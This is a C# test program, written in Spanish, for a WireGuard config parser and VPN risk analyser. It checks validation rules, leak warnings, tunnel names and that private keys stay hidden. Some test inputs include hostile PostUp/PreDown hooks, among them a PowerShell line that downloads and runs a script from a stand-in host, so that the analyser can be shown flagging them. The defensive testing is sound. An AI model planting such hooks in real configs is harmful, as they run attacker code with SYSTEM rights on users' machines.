using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Nexo.Modules.Threats.Enlaces;
using Nexo.Modules.Threats.Vpn;
using Nexo.Modules.Threats.Vulnerabilidades;
using Nexo.Reports.Model;

namespace Nexo.Vpn.Demo
{
    internal static class Program
    {
        private static int _fallos;

        private static void Check(bool condicion, string descripcion, string? detalle = null)
        {
            if (!condicion) _fallos++;
            Console.WriteLine($"  [{(condicion ? "OK" : "FALLO")}]    {descripcion}");
            if (!condicion && detalle is not null) Console.WriteLine("           " + detalle);
        }

        private static string Clave() => Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

        private static readonly string Privada = Clave(), Publica = Clave(), Compartida = Clave();

        /// <summary>Con la forma de los archivos que entregan los proveedores (claves aleatorias).</summary>
        private static string Conf(string allowed = "0.0.0.0/0, ::/0", string? dns = "10.2.0.1", string extraInterfaz = "", string extraPeer = "", string? endpoint = "149.88.104.1:51820")
            => "[Interface]\n# Clave para Nexo (prueba)\nPrivateKey = " + Privada + "\nAddress = 10.2.0.2/32\n" + (dns is null ? "" : "DNS = " + dns + "\n") + extraInterfaz +
               "\n[Peer]\n# CL#12\nPublicKey = " + Publica + "\nPresharedKey = " + Compartida + "\nAllowedIPs = " + allowed + "\n" +
               (endpoint is null ? "" : "Endpoint = " + endpoint + "\n") + "PersistentKeepalive = 25\n" + extraPeer;

        private static LecturaDeConfiguracionWg L(string texto, string archivo = "proton-CL-12.conf") => ParserDeWireGuard.Leer(texto, archivo);

        private static ResultadoDeAnalisis An(string texto, ListasDePhishing? l = null) => AnalizadorDeVpn.Analizar(L(texto).Configuracion!, l);

        private static string Ids(ResultadoDeAnalisis r) => string.Join(",", r.Hallazgos.Select(h => h.Id + ":" + h.Severidad));

        private static bool Tiene(ResultadoDeAnalisis r, string id, Severidad? s = null) => r.Hallazgos.Any(h => h.Id == id && (s is null || h.Severidad == s));

        public static int Main()
        {
            Console.OutputEncoding = new UTF8Encoding(false);
            ProbarLectura();
            ProbarErrores();
            ProbarNombres();
            ProbarAnalisis();
            ProbarClavesNuncaSeMuestran();
            ProbarTextos();
            Console.WriteLine();
            Console.WriteLine(_fallos == 0 ? "TODAS LAS VERIFICACIONES PASARON" : _fallos + " VERIFICACIONES FALLIDAS");
            return _fallos == 0 ? 0 : 1;
        }

        private static void ProbarLectura()
        {
            Console.WriteLine("1. Leer un archivo de WireGuard");
            LecturaDeConfiguracionWg l = L(Conf());
            Check(l.Valida && l.Errores.Count == 0 && l.NombreDeTunel == "proton-CL-12", "un archivo como los de los proveedores es válido, y el túnel se llama como el archivo sin «.conf»", string.Join(" | ", l.Errores));
            ConfiguracionWg c = l.Configuracion!;
            Check(c.Interfaz.TieneClavePrivada && c.Interfaz.Direcciones.SequenceEqual(new[] { "10.2.0.2/32" }) && c.Interfaz.Dns.SequenceEqual(new[] { "10.2.0.1" }), "interfaz: clave (sin guardarla), dirección y DNS");
            PeerWg p = c.Peers.Single();
            Check(p.ClavePublica == Publica && p.TieneClaveCompartida && p.IpsPermitidas.SequenceEqual(new[] { "0.0.0.0/0", "::/0" }) && p.HostDelEndpoint == "149.88.104.1" && p.PuertoDelEndpoint == 51820 && p.KeepAlive == 25,
                "servidor: clave pública, rutas, dirección, puerto y keepalive");

            string raro = "\uFEFF[INTERFACE]\r\n  privatekey=" + Privada + "   # comentario al final\r\naddress = 10.0.0.2\r\n[peer]\r\nPUBLICKEY = " + Publica + "\r\nallowedips = 10.0.0.0/24\r\nendpoint = [2001:db8::1]:51820\r\npersistentkeepalive = off\r\n";
            LecturaDeConfiguracionWg lr = L(raro);
            Check(lr.Valida && lr.Configuracion!.Peers[0].KeepAlive == 0 && lr.Configuracion.Peers[0].HostDelEndpoint == "2001:db8::1",
                "mayúsculas en secciones y claves, BOM, fines de línea de Windows, comentario al final de línea, IPv6 entre corchetes y «off»", string.Join(" | ", lr.Errores));
            Check(L(Conf(endpoint: "vpn.ejemplo.com:443")).Configuracion!.Peers[0].HostDelEndpoint == "vpn.ejemplo.com", "un servidor por nombre");
            Check(L(Conf(extraInterfaz: "MTU = 576\nTable = off\nListenPort = 0\n")).Valida && L(Conf(extraInterfaz: "Table = 4294967295\n")).Valida, "MTU 576, Table off y un Table numérico de 32 bits son válidos");
            Check(L(Conf(extraInterfaz: "PostUp = powershell -c calc\n")).Configuracion!.Interfaz.Scripts.Single().Comando == "powershell -c calc", "un PostUp se lee (para avisar), tal cual");
        }

        private static void ProbarErrores()
        {
            Console.WriteLine("2. Lo que WireGuard rechazaría (mismas reglas)");
            void Mal(string texto, string contiene, string desc)
            {
                LecturaDeConfiguracionWg l = L(texto);
                Check(!l.Valida && l.Configuracion is null && l.Errores.Any(e => e.Contains(contiene)), desc, string.Join(" | ", l.Errores));
            }
            Mal(Conf(extraInterfaz: "SaveConfig = true\n"), "«saveconfig» no es una clave válida en [Interface]", "una clave desconocida es error (WireGuard no la ignora)");
            Mal(Conf(extraPeer: "Comment = hola\n"), "no es una clave válida en [Peer]", "también en [Peer]");
            Mal("PrivateKey = " + Privada + "\n" + Conf(), "línea 1: está fuera de una sección", "una línea antes de la primera sección, con su número de línea");
            Mal(Conf(extraInterfaz: "MTU\n"), "falta el «=»", "una línea sin «=»");
            Mal(Conf(extraInterfaz: "MTU = \n"), "no tiene valor", "una clave sin valor");
            Mal(Conf(extraInterfaz: "MTU = 575\n"), "MTU inválido", "MTU 575 (el mínimo es 576)");
            Mal(Conf(extraInterfaz: "MTU = 65536\n"), "MTU inválido", "MTU 65536");
            Mal(Conf(extraPeer: "PersistentKeepalive = 65536\n"), "PersistentKeepalive inválido", "keepalive fuera de rango");
            Mal(Conf(extraInterfaz: "Table = mia\n"), "Table inválido", "un Table que no es off/auto/main ni un número");
            Mal(Conf().Replace(Privada, Privada.Substring(0, 40) + "AA=="), "32 bytes", "una clave de 44 caracteres que decodifica a 31 bytes");
            Mal(Conf().Replace(Publica, "esto-no-es-base64-de-ningun-modo-ni-de-lejos"), "32 bytes", "una clave que no es base64");
            Mal(Conf(allowed: "10.0.0.1/33"), "prefijo fuera de rango", "una red /33");
            Mal(Conf(allowed: "fe80::1%3/64"), "no es una dirección IP válida", "una IPv6 con zona («%3»)");
            Mal(Conf(allowed: "10.0.1/24"), "no es una dirección IP válida", "una IPv4 abreviada (10.0.1)");
            Mal(Conf(endpoint: "149.88.104.1"), "Endpoint inválido", "un servidor sin puerto");
            Mal(Conf(endpoint: "a:b:51820"), "Endpoint inválido", "un servidor con dos «:» sin corchetes");
            Mal(Conf(endpoint: "vpn.ejemplo.com:70000"), "Endpoint inválido (puerto)", "un puerto fuera de rango");
            Mal(Conf(endpoint: "vpn ejemplo.com:51820"), "Endpoint inválido", "un servidor con espacios");
            Mal(Conf().Replace("PublicKey = " + Publica + "\n", ""), "deben tener PublicKey", "un [Peer] sin PublicKey");
            Mal(Conf().Replace("[Interface]", "[Interfaz]"), "línea 1: está fuera de una sección", "una sección con otro nombre no se acepta (como en WireGuard: queda fuera de sección)");
            Mal("[Peer]\nPublicKey = " + Publica + "\nAllowedIPs = 0.0.0.0/0\n", "falta la sección [Interface]", "sin [Interface]");
            Mal(Conf().Replace("PrivateKey = " + Privada + "\n", ""), "debe tener PrivateKey", "sin PrivateKey");
            LecturaDeConfiguracionWg malaClave = L(Conf().Replace(Privada, "corta"));
            Check(malaClave.Errores.Count == 1 && malaClave.Errores[0].Contains("32 bytes"), "una PrivateKey inválida da UN error (no además «falta PrivateKey»)", string.Join(" | ", malaClave.Errores));
            Check(!L("", "x.conf").Valida && !L(new string('#', ParserDeWireGuard.MaximoDeCaracteres + 1), "x.conf").Valida, "vacío o de más de 64 KB: no válido");
        }

        private static void ProbarNombres()
        {
            Console.WriteLine("3. Nombres de túnel (reglas de wireguard-windows, conf/name.go)");
            Check(ParserDeWireGuard.ValidarNombre("proton-CL-12") is null && ParserDeWireGuard.ValidarNombre("a=b+c.d_e") is null, "letras, números y _ = + . - valen");
            Check(ParserDeWireGuard.ValidarNombre("mi vpn") is not null && ParserDeWireGuard.ValidarNombre("Señal") is not null && ParserDeWireGuard.ValidarNombre("a$b") is not null,
                "espacios, «ñ» y «$» no valen");
            Check(ParserDeWireGuard.ValidarNombre(new string('a', 32)) is null && ParserDeWireGuard.ValidarNombre(new string('a', 33))?.Contains("32") == true, "32 caracteres valen; 33 no");
            Check(ParserDeWireGuard.ValidarNombre("CON")?.Contains("reservado") == true && ParserDeWireGuard.ValidarNombre("nul.respaldo")?.Contains("reservado") == true && ParserDeWireGuard.ValidarNombre("Com7") is not null,
                "nombres reservados de Windows, también con algo detrás del punto y en minúsculas");
            Check(ParserDeWireGuard.ValidarNombre("COM10") is null && ParserDeWireGuard.ValidarNombre("console") is null, "«COM10» y «console» no son reservados");
            Check(ParserDeWireGuard.ValidarNombre(".oculto") is not null && ParserDeWireGuard.ValidarNombre("fin.") is not null, "no puede empezar ni terminar en punto");
            Check(ParserDeWireGuard.NombreDesdeArchivo(@"C:\Descargas\wg-CL.conf") == "wg-CL" && ParserDeWireGuard.NombreDesdeArchivo("WG.CONF") == "WG", "el nombre sale del archivo, sin la ruta ni «.conf»");
            LecturaDeConfiguracionWg l = L(Conf(), "mi vpn de casa.conf");
            Check(l.Configuracion is not null && !l.Valida && l.ErrorDeNombre is not null, "contenido bien y nombre mal: se dice aparte (renombrar el archivo basta)");
        }

        private static void ProbarAnalisis()
        {
            Console.WriteLine("4. Qué hace la VPN según el archivo");
            ResultadoDeAnalisis bien = An(Conf());
            Check(bien.Maxima == Severidad.Info && Tiene(bien, "VPN-SERVIDOR") && Tiene(bien, "VPN-ARCHIVO-CON-CLAVE") && bien.Completo, "todo por la VPN, IPv4 e IPv6, con DNS: solo notas", Ids(bien));
            Check(bien.Hallazgos.Single(h => h.Id == "VPN-SERVIDOR").Detalle.Contains("no te hace anónimo"), "la nota del servidor dice que una VPN no te hace anónimo");
            ResultadoDeAnalisis v4 = An(Conf(allowed: "0.0.0.0/0"));
            Check(Tiene(v4, "VPN-FUGA-IPV6", Severidad.Media), "solo IPv4 (0.0.0.0/0): el IPv6 puede salir por fuera (Media)", Ids(v4));
            ResultadoDeAnalisis mitades = An(Conf(allowed: "0.0.0.0/1, 128.0.0.0/1, ::/1, 8000::/1"));
            Check(!Tiene(mitades, "VPN-FUGA-IPV6") && !Tiene(mitades, "VPN-TUNEL-PARCIAL"), "las dos mitades (0.0.0.0/1 + 128.0.0.0/1, ::/1 + 8000::/1) cuentan como «todo»", Ids(mitades));
            ResultadoDeAnalisis mitadesV4 = An(Conf(allowed: "0.0.0.0/1, 128.0.0.0/1"));
            Check(Tiene(mitadesV4, "VPN-FUGA-IPV6", Severidad.Media) && !Tiene(mitadesV4, "VPN-TUNEL-PARCIAL"), "solo las dos mitades de IPv4: es «todo IPv4», así que avisa de la fuga IPv6", Ids(mitadesV4));
            ResultadoDeAnalisis sinDns = An(Conf(dns: null));
            Check(Tiene(sinDns, "VPN-SIN-DNS", Severidad.Media), "todo por la VPN sin DNS: Media", Ids(sinDns));
            ResultadoDeAnalisis parcial = An(Conf(allowed: "10.0.0.0/8, 192.168.50.0/24", dns: null));
            Check(Tiene(parcial, "VPN-TUNEL-PARCIAL", Severidad.Info) && !Tiene(parcial, "VPN-SIN-DNS") && !Tiene(parcial, "VPN-FUGA-IPV6") && parcial.Maxima == Severidad.Info,
                "solo unas redes (VPN de trabajo): nota, sin acusar fugas ni falta de DNS", Ids(parcial));
            ResultadoDeAnalisis scripts = An(Conf(extraInterfaz: "PostUp = powershell -c iwr http://x.example/a.ps1|iex\nPreDown = net user\n"));
            HallazgoDeSistema? s = scripts.Hallazgos.FirstOrDefault(h => h.Id == "VPN-SCRIPTS");
            Check(s is { Severidad: Severidad.Alta } && s.Titulo.Contains("PostUp, PreDown") && s.Detalle.Contains("iwr http://x.example/a.ps1") && s.Detalle.Contains("SYSTEM"),
                "comandos PostUp/PreDown: Alta, con los comandos a la vista y el porqué", s?.Titulo + " / " + s?.Detalle);
            ResultadoDeAnalisis sinEndpoint = An(Conf(endpoint: null));
            Check(Tiene(sinEndpoint, "VPN-SIN-ENDPOINT", Severidad.Media) && !Tiene(sinEndpoint, "VPN-SERVIDOR"), "un servidor sin dirección: Media", Ids(sinEndpoint));
            var lista = new ListasDePhishing(ParserDeListas.LeerPhishingArmy(ArmyCon("vpn-gratis-malo.example"), DateTimeOffset.UtcNow).Lista, null);
            ResultadoDeAnalisis enLista = An(Conf(endpoint: "nodo1.vpn-gratis-malo.example:51820"), lista);
            Check(Tiene(enLista, "VPN-SERVIDOR-EN-LISTA", Severidad.Alta), "un servidor en la lista de phishing: Alta", Ids(enLista));
            ResultadoDeAnalisis dos = An(Conf(extraPeer: "\n[Peer]\nPublicKey = " + Clave() + "\nAllowedIPs = 10.9.0.0/16\nEndpoint = 1.2.3.4:51820\n"));
            Check(Tiene(dos, "VPN-VARIOS-SERVIDORES", Severidad.Info) && dos.Hallazgos.Count(h => h.Id == "VPN-SERVIDOR") == 2, "dos servidores: nota, y cada uno nombrado", Ids(dos));
            Check(Tiene(An(Conf(extraInterfaz: "MTU = 1200\n")), "VPN-MTU", Severidad.Baja) && !Tiene(An(Conf(extraInterfaz: "MTU = 1420\n")), "VPN-MTU"), "MTU 1200: Baja; 1420: nada");
            Check(bien.Hallazgos[0].Severidad >= bien.Hallazgos[^1].Severidad && scripts.Hallazgos[0].Id == "VPN-SCRIPTS", "del más grave al menos grave");
        }

        private static string ArmyCon(string dominio)
        {
            var sb = new StringBuilder("# Generated: 2026-11-09T14:00:33Z\n# Entries: 1001\n# Format: domains; version=1\n");
            for (int i = 0; i < 1000; i++) sb.Append("relleno-").Append(i).Append(".example\n");
            sb.Append(dominio).Append('\n');
            return sb.ToString();
        }

        private static void ProbarClavesNuncaSeMuestran()
        {
            Console.WriteLine("5. La clave privada y la compartida nunca salen");
            string texto = Conf(allowed: "0.0.0.0/0", dns: null, extraInterfaz: "PostUp = echo hola\n");
            LecturaDeConfiguracionWg l = L(texto);
            ResultadoDeAnalisis r = AnalizadorDeVpn.Analizar(l.Configuracion!);
            string todo = JsonSerializer.Serialize(l) + JsonSerializer.Serialize(r);
            Check(todo.Contains(Publica) && !todo.Contains(Privada) && !todo.Contains(Compartida), "ni en la lectura ni en el análisis (serializados enteros) aparece la clave privada ni la compartida; la pública sí");
            LecturaDeConfiguracionWg mal = L(texto.Replace("MTU", "") + "MTU = 1\n");
            Check(!string.Join(" ", mal.Errores).Contains(Privada), "tampoco en los mensajes de error");
        }

        private static void ProbarTextos()
        {
            Console.WriteLine("6. Textos con tildes");
            var textos = new List<string>();
            foreach (string t in new[] { Conf(), Conf(allowed: "0.0.0.0/0", dns: null, extraInterfaz: "PostUp = x\nMTU = 1200\n"), Conf(allowed: "10.0.0.0/8"), Conf(endpoint: null),
                                         Conf(extraPeer: "\n[Peer]\nPublicKey = " + Clave() + "\nAllowedIPs = 10.9.0.0/16\n") })
                textos.AddRange(An(t).Hallazgos.SelectMany(h => new[] { h.Titulo, h.Detalle, h.Recomendacion }));
            foreach (string t in new[] { Conf(extraInterfaz: "X = 1\nMTU = 2\n"), "a", Conf(endpoint: "x"), Conf(allowed: "1.2.3.4/40") })
                textos.AddRange(L(t).Errores);
            textos.Add(ParserDeWireGuard.ValidarNombre("mi vpn")!); textos.Add(ParserDeWireGuard.ValidarNombre("CON")!); textos.Add(ParserDeWireGuard.ValidarNombre(".x")!);
            var sinTilde = new Regex(@"\b(trafico|dias|numero|numeros|tambien|anonimo|direccion|valida|valido|invalido|invalida|seccion|linea|lineas|mas|mitad|parte|aqui|alli|servidor|publica|clave|ejecutarian|ejecucion|despues|pais)\b");
            string[] malas = textos.Where(t => sinTilde.Matches(t).Cast<Match>().Any(m => m.Value is not ("mitad" or "parte" or "servidor" or "clave"))).ToArray();
            Check(textos.Count > 30 && malas.Length == 0, "ninguna palabra que lleva tilde aparece sin ella (" + textos.Count + " textos)", string.Join(" || ", malas.Take(3)));
        }
    }
}
